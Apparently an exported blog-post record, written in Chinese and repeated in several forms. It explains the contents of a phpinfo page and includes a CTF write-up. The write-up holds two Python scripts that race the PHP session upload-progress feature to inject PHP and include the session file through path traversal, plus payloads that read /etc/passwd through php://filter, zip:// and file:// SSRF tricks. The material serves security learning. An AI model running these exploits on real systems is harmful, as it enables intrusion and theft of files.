\n\nzlib.\\*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 \n\nconvert.iconv.\\*用来转换编码。 \n\nstring.\\*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 \n\nconvert.\\*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 \n\ndechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ [链接：](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)[Chunked transfer encoding - Wikipedia](https://en.wikipedia.org/wiki/Chunked_transfer_encoding) ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。\n\n 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile('php://filter/read=convert.base64-encode/resource=/etc/passwd'); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 [链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)  。\n\n图9:\n\n![](https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png)\n\n## session uplaod\n\n图10:\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png)\n\n`session.upload_progress.enabled = on` 说明可以覆盖session\n\n`clean up`说明需要竞争\n\n图11：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png)\n\nsessionupload.py\n\n```\n#!coding:utf-8\nimport requests\nimport time\n\nurl = 'http://116.62.71.206:52872/?f=login.php'\ndata = {'name':'admin','pass':'sctf2018_h656cDBkU2'}\n\nr = requests.post(url,data = data)\nPHPSESSID = r.cookies['PHPSESSID']\nprint 'input the PHPSESSID in include.py' +'\\n' + PHPSESSID\ntime.sleep(10)\n\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php'\n    files = { \n    \"PHP_SESSION_UPLOAD_PROGRESS\" : (None,'<?php echo file_get_contents(\"/tmp/flag_56CcE97QGNxDEXNpW3HY\");?>'),  \n\n    \"upload\" : (\"tmp.jpg\", open(\"tmp.png\", \"rb\"), \"image/png\"), \n\n    \"submit\" : (None,\"submit\")\n    }  \n    #proxies = {'http':'http://127.0.0.1:8080'}\n    headers = {'Cookie':'PHPSESSID=' + PHPSESSID}\n    r = requests.post(url,files = files , headers = headers)\n    print r.text\n    print PHPSESSID\n    #开了cleanup，需要竞争，并且保持回话的session\n```\n\ninclude.py\n\n```\n#!coding:utf-8\n\nimport requests\nPHPSESSID = 'qc2kavokdjiiepu283hduivod2'\nwhile 1:\n    url = 'http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_' + PHPSESSID\n    print url\n    r = requests.get(url)\n    if 'SCTF' in r.text:\n        print r.text\n        break\n```\n\n\n\n## 案例\n\n以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 \n\n利用php filter绕过死亡exit：[链接：](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html) \n\n利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php \n\n利用curl+gopher协议进行SSRF漏洞利用： [链接：](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html)[Do Evil Things with gopher://](http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html) \n\nSSRF检查host时进行文件读取：file://localhost/etc/passwd \n\n利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 \n\nphp://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd","slug":"phpinfo解读","published":1,"updated":"2018-06-25T07:28:36.739Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jph000ily4jtg96nscx","content":"<h1 id=\"phpinfo解读\"><a href=\"#phpinfo解读\" class=\"headerlink\" title=\"phpinfo解读\"></a>phpinfo解读</h1><a id=\"more\"></a>\n<p>我们以 <a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">phpinfo()</a> 为例来讲解吧。</p>\n<h2 id=\"版本更迭\"><a href=\"#版本更迭\" class=\"headerlink\" title=\"版本更迭\"></a>版本更迭</h2><p>phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。</p>\n<p> PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：</p>\n<ol>\n<li>移除不支持SQL预编译的Mysql扩展：mysql </li>\n<li>移除preg_replace中容易导致代码执行漏洞的正则模式：e </li>\n<li>assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 </li>\n<li>hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 <a href=\"https://3v4l.org/ORuc7\" target=\"_blank\" rel=\"noopener\">链接：https://3v4l.org/ORuc7</a> </li>\n<li>7.2中废弃可以动态执行字符串的 create_function </li>\n<li>7.2中废弃容易导致变量覆盖的无第二个参数的parse_str </li>\n<li>移除<code>&lt;script language=&quot;php&quot;\\&gt;</code>和<code>&lt;%</code>，这两种另类的PHP标签 </li>\n<li>移除dl函数</li>\n</ol>\n<p>这里是关于PHP版本支持的一些说明 <a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">PHP: Supported Versions</a> PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 <a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">php各版本的姿势(2017-02-15更新) - l3m0n - 博客园</a> 大家可以再温故一下，我就不再介绍了。</p>\n<p>和版本有关的一些tricks：</p>\n<ul>\n<li><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> </li>\n</ul>\n<p>这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： </p>\n<ul>\n<li><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">Online PHP editor | Run code in 200  PHP &amp; HHVM ve…</a> </li>\n<li><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">PHP Sandbox, test PHP online, PHP tester</a></li>\n</ul>\n<h2 id=\"php-ini\"><a href=\"#php-ini\" class=\"headerlink\" title=\"php.ini\"></a>php.ini</h2><p>图1中的四项配置，与php.ini有关。</p>\n<p>图一:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<p> php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 </p>\n<p>这里有一点值得注意，那就是“默认配置”的含义： </p>\n<ol>\n<li>没有任何php.ini时，某个配置项默认的值 </li>\n<li>用apt等源管理工具安装php后，默认php.ini里配置的值 </li>\n</ol>\n<p>上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ <a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全…</a> ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个<a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W…</a>)。</p>\n<p>文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。</p>\n<p> 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： </p>\n<blockquote>\n<p>docker run –rm –name php1 -it -p 8080:80 -v <code>pwd</code>:/var/www/html php:7.2-apache </p>\n</blockquote>\n<p>再用docker启动一个默认的debian环境，并用apt源安装php5：</p>\n<blockquote>\n<p>docker run –rm –name php2 -it -p 8081:80 -v <code>pwd</code>:/var/www/html debian:8 bash apt-get update &amp;&amp; apt-get install -y php5 </p>\n<p>php -S 0.0.0.0:80 -t /var/www/html </p>\n</blockquote>\n<p>然后，我们输出一下两个环境的request_order取值，以及\\$_REQUEST变量：图2。 可见，在request_order为空的时候，\\$_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。</p>\n<p> 所以，这两种默认值的含义，需要区分清楚，避免出现错误。</p>\n<p>图二:</p>\n<p><img src=\"https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png\" alt=\"\"></p>\n<p>图三:</p>\n<p><img src=\"https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png\" alt=\"\"></p>\n<p>win10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是”CGP”</p>\n<p>除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定–with-config-file-path和–with-config-file-scan-dir。`</p>\n<p> 这两个配置项的意思是，PHP会在–with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在–with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在–with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 </p>\n<p>这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。</p>\n<p>图四:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<h2 id=\"SAPI\"><a href=\"#SAPI\" class=\"headerlink\" title=\"SAPI\"></a>SAPI</h2><p>见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 </p>\n<p>这篇文章（ <a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">理解php内核中SAPI的作用 – 积木村の研究所</a> ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(“HTTP_COOKIE”)。 </p>\n<p>下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ <a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌</a>  ）。</p>\n<p>图5:</p>\n<p><img src=\"https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png\" alt=\"\"></p>\n<p> PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。</p>\n<p> 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。</p>\n<p>图6:</p>\n<p><img src=\"https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png\" alt=\"\"></p>\n<p>这个SAPI就是给命令行用的。 </p>\n<p>另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 </p>\n<p>图7:</p>\n<p><img src=\"https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png\" alt=\"PHP\"> </p>\n<p>Built-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 </p>\n<p>在很古老的时候，rfc3875（ <a href=\"http://www.ietf.org/rfc/rfc3875\" target=\"_blank\" rel=\"noopener\">链接：http://www.ietf.org/rfc/rfc3875</a> ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 </p>\n<p>除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：<a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅</a> 。 </p>\n<p>原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。</p>\n<p> uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 <a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">vulhub/Dockerfile at master · vulhub/vulhub · GitH…</a> 看到整个编译的过程。 </p>\n<p>phpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。</p>\n<h2 id=\"php支持的协议\"><a href=\"#php支持的协议\" class=\"headerlink\" title=\"php支持的协议\"></a>php支持的协议</h2><p>图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 </p>\n<p>https和http自然不用说，用来包装http协议，我们可以执行readfile(‘<a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">Example Domain</a>‘);来发送一个http请求。 </p>\n<p>ftps和ftp，用来包装ftp协议，和http类似。 </p>\n<p>compress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile(‘compress.zlib://file.gz’);来读取用zlib压缩过的文件。 </p>\n<p>php是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：<a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">PHP: php:// - Manual</a> </p>\n<p>file用来访问本地文件，比如readfile(‘file:///etc/passwd’);</p>\n<p> glob用来以模式匹配的方式访问本地目录，比如 dir(‘glob:///etc/*’)。 </p>\n<p>data可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile(‘data://text/plain;base64,SGVsbG8=’); 来解码base64串，并将其作为输入流读取。 </p>\n<p>phar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。</p>\n<p> 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；</p>\n<p>compress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。</p>\n<p>另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。</p>\n<p>图8:</p>\n<p><img src=\"https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png\" alt=\"\"></p>\n<h2 id=\"Registered-Stream-Filters\"><a href=\"#Registered-Stream-Filters\" class=\"headerlink\" title=\"Registered Stream Filters\"></a>Registered Stream Filters</h2><p>Registered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 </p>\n<p>zlib.*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 </p>\n<p>convert.iconv.*用来转换编码。 </p>\n<p>string.*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 </p>\n<p>convert.*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 </p>\n<p>dechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ <a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">Chunked transfer encoding - Wikipedia</a> ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。</p>\n<p> 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile(‘php://filter/read=convert.base64-encode/resource=/etc/passwd’); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 <a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a>  。</p>\n<p>图9:</p>\n<p><img src=\"https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png\" alt=\"\"></p>\n<h2 id=\"session-uplaod\"><a href=\"#session-uplaod\" class=\"headerlink\" title=\"session uplaod\"></a>session uplaod</h2><p>图10:</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png\" alt=\"\"></p>\n<p><code>session.upload_progress.enabled = on</code> 说明可以覆盖session</p>\n<p><code>clean up</code>说明需要竞争</p>\n<p>图11：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png\" alt=\"\"></p>\n<p>sessionupload.py</p>\n<pre><code>#!coding:utf-8\nimport requests\nimport time\n\nurl = &#39;http://116.62.71.206:52872/?f=login.php&#39;\ndata = {&#39;name&#39;:&#39;admin&#39;,&#39;pass&#39;:&#39;sctf2018_h656cDBkU2&#39;}\n\nr = requests.post(url,data = data)\nPHPSESSID = r.cookies[&#39;PHPSESSID&#39;]\nprint &#39;input the PHPSESSID in include.py&#39; +&#39;\\n&#39; + PHPSESSID\ntime.sleep(10)\n\nwhile 1:\n    url = &#39;http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php&#39;\n    files = { \n    &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : (None,&#39;&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;&#39;),  \n\n    &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;tmp.png&quot;, &quot;rb&quot;), &quot;image/png&quot;), \n\n    &quot;submit&quot; : (None,&quot;submit&quot;)\n    }  \n    #proxies = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;}\n    headers = {&#39;Cookie&#39;:&#39;PHPSESSID=&#39; + PHPSESSID}\n    r = requests.post(url,files = files , headers = headers)\n    print r.text\n    print PHPSESSID\n    #开了cleanup，需要竞争，并且保持回话的session\n</code></pre><p>include.py</p>\n<pre><code>#!coding:utf-8\n\nimport requests\nPHPSESSID = &#39;qc2kavokdjiiepu283hduivod2&#39;\nwhile 1:\n    url = &#39;http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_&#39; + PHPSESSID\n    print url\n    r = requests.get(url)\n    if &#39;SCTF&#39; in r.text:\n        print r.text\n        break\n</code></pre><h2 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h2><p>以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 </p>\n<p>利用php filter绕过死亡exit：<a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a> </p>\n<p>利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php </p>\n<p>利用curl+gopher协议进行SSRF漏洞利用： <a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">Do Evil Things with gopher://</a> </p>\n<p>SSRF检查host时进行文件读取：file://localhost/etc/passwd </p>\n<p>利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 </p>\n<p>php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"phpinfo解读\"><a href=\"#phpinfo解读\" class=\"headerlink\" title=\"phpinfo解读\"></a>phpinfo解读</h1>","more":"<p>我们以 <a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://675ba661.2m1.pw/5a258c55-e0e9-495c-8b74-4ffd2885a2f8.php\" target=\"_blank\" rel=\"noopener\">phpinfo()</a> 为例来讲解吧。</p>\n<h2 id=\"版本更迭\"><a href=\"#版本更迭\" class=\"headerlink\" title=\"版本更迭\"></a>版本更迭</h2><p>phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。</p>\n<p> PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：</p>\n<ol>\n<li>移除不支持SQL预编译的Mysql扩展：mysql </li>\n<li>移除preg_replace中容易导致代码执行漏洞的正则模式：e </li>\n<li>assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 </li>\n<li>hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 <a href=\"https://3v4l.org/ORuc7\" target=\"_blank\" rel=\"noopener\">链接：https://3v4l.org/ORuc7</a> </li>\n<li>7.2中废弃可以动态执行字符串的 create_function </li>\n<li>7.2中废弃容易导致变量覆盖的无第二个参数的parse_str </li>\n<li>移除<code>&lt;script language=&quot;php&quot;\\&gt;</code>和<code>&lt;%</code>，这两种另类的PHP标签 </li>\n<li>移除dl函数</li>\n</ol>\n<p>这里是关于PHP版本支持的一些说明 <a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">PHP: Supported Versions</a> PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 <a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">php各版本的姿势(2017-02-15更新) - l3m0n - 博客园</a> 大家可以再温故一下，我就不再介绍了。</p>\n<p>和版本有关的一些tricks：</p>\n<ul>\n<li><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> </li>\n</ul>\n<p>这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： </p>\n<ul>\n<li><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">Online PHP editor | Run code in 200  PHP &amp; HHVM ve…</a> </li>\n<li><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">PHP Sandbox, test PHP online, PHP tester</a></li>\n</ul>\n<h2 id=\"php-ini\"><a href=\"#php-ini\" class=\"headerlink\" title=\"php.ini\"></a>php.ini</h2><p>图1中的四项配置，与php.ini有关。</p>\n<p>图一:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<p> php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 </p>\n<p>这里有一点值得注意，那就是“默认配置”的含义： </p>\n<ol>\n<li>没有任何php.ini时，某个配置项默认的值 </li>\n<li>用apt等源管理工具安装php后，默认php.ini里配置的值 </li>\n</ol>\n<p>上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ <a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全…</a> ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个<a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W…</a>)。</p>\n<p>文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。</p>\n<p> 